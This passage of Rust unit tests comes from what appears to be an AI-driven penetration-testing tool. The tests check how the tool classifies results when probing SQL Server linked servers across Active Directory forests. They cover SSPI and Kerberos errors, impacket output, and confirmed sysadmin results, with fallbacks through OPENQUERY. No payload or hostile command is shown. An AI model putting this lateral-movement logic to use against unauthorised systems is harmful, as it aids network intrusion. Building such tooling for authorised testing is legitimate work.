            "OLE DB provider \"MSOLEDBSQL\" for linked server \"SQL02\" returned message \
             \"Cannot generate SSPI context\"."
                .into(),
        );
        assert!(probe_failure_is_cross_forest_shape(&outcome));
    }

    #[test]
    fn cross_forest_shape_matches_sspi_handshake() {
        let outcome = ProbeOutcome::ToolError(
            "exit 1".into(),
            "ERROR: SSPI handshake failed during NEGOTIATE phase".into(),
        );
        assert!(probe_failure_is_cross_forest_shape(&outcome));
    }

    #[test]
    fn cross_forest_shape_matches_kdc_err() {
        let outcome =
            ProbeOutcome::ToolError("auth".into(), "krb5: KDC_ERR_S_PRINCIPAL_UNKNOWN".into());
        assert!(probe_failure_is_cross_forest_shape(&outcome));
    }

    #[test]
    fn cross_forest_shape_matches_no_evidence_with_sspi_log() {
        // Tool exited 0 (impacket's mssqlclient.py can swallow some MSSQL
        // errors into stdout) but stdout carries the SSPI trace — still
        // worth retrying via OPENQUERY.
        let outcome =
            ProbeOutcome::NoEvidence("Connecting...\n[!] Cannot generate SSPI context\n".into());
        assert!(probe_failure_is_cross_forest_shape(&outcome));
    }

    #[test]
    fn cross_forest_shape_ignores_remote_query_disabled() {
        // This is a server configuration error — `Server is not configured
        // for RPC` — OPENQUERY does NOT help (OPENQUERY needs `data access`
        // ON, not RPC OUT, but a server with RPC off may still have data
        // access off too). Treat as non-cross-forest so the retry/abandon
        // logic owns it.
        let outcome = ProbeOutcome::ToolError(
            "exit 1".into(),
            "Msg 7411: Server 'SQL02' is not configured for RPC.".into(),
        );
        assert!(!probe_failure_is_cross_forest_shape(&outcome));
    }

    #[test]
    fn cross_forest_shape_ignores_missing_linked_server() {
        let outcome = ProbeOutcome::ToolError(
            "exit 1".into(),
            "Msg 7202: Could not find server 'SQLX' in sys.servers.".into(),
        );
        assert!(!probe_failure_is_cross_forest_shape(&outcome));
    }

    #[test]
    fn cross_forest_shape_ignores_dispatch_failure() {
        // Transport / queue error — no auth involved, OPENQUERY wouldn't
        // help.
        let outcome = ProbeOutcome::DispatchFailure("connection refused".into());
        assert!(!probe_failure_is_cross_forest_shape(&outcome));
    }

    #[test]
    fn cross_forest_shape_ignores_confirmed() {
        // A confirmed result by definition isn't a failure shape.
        let outcome = ProbeOutcome::Confirmed("who is_sa srv\n--- ----- ---\n...".into());
        assert!(!probe_failure_is_cross_forest_shape(&outcome));
    }

    #[test]
    fn cross_forest_shape_is_case_insensitive() {
        // SQL Server's error capitalisation varies by version / locale; the
        // matcher must lowercase before checking.
        let outcome = ProbeOutcome::ToolError(
            "auth".into(),
            "LOGIN FAILED FOR USER 'FOREST1\\ALICE'".into(),
        );
        assert!(probe_failure_is_cross_forest_shape(&outcome));
    }

    // ── classify_probe_result (shared classifier path) ─────────────────

    #[test]
    fn classify_tool_error_propagates_error_and_output() {
        let result: anyhow::Result<ares_llm::ToolExecResult> = Ok(ares_llm::ToolExecResult {
            output: "Msg 18456 Login failed".into(),
            error: Some("exit 1".into()),
            discoveries: None,
        });
        let outcome = classify_probe_result(&result);
        match outcome {
            ProbeOutcome::ToolError(e, o) => {
                assert_eq!(e, "exit 1");
                assert!(o.contains("Login failed"));
            }
            other => panic!("expected ToolError, got {other:?}"),
        }
    }

    #[test]
    fn classify_confirmed_when_probe_columns_present() {
        let result: anyhow::Result<ares_llm::ToolExecResult> = Ok(ares_llm::ToolExecResult {
            output: "who          is_sa  srv\n----         -----  ---\nFOREST2\\sa  1      SQL02"
                .into(),
            error: None,
            discoveries: None,
        });
        assert!(matches!(
            classify_probe_result(&result),
            ProbeOutcome::Confirmed(_)
        ));
    }

    #[test]
    fn classify_no_evidence_when_clean_exit_but_no_probe_columns() {
        let result: anyhow::Result<ares_llm::ToolExecResult> = Ok(ares_llm::ToolExecResult {
            output: "SQL> EXEC (...)\n(0 rows affected)".into(),
            error: None,
            discoveries: None,
        });
        assert!(matches!(
            classify_probe_result(&result),
            ProbeOutcome::NoEvidence(_)
        ));
    }
}
